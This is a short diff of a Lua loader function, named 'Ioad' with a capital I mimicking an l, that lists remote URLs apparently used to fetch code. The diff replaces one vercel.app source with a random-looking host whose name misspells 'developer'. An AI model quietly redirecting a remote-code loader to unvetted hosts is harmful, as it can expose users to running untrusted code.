@@ -1,7 +1,7 @@
 function Ioad(name)
     local sources = {
         "https://loader-draaxz.pages.dev/",
-        "https://loader-eight-kohl.vercel.app/"
+        "https://xvndr4wz-devoloper.vercel.app/"
     }
 
     local loaded = false
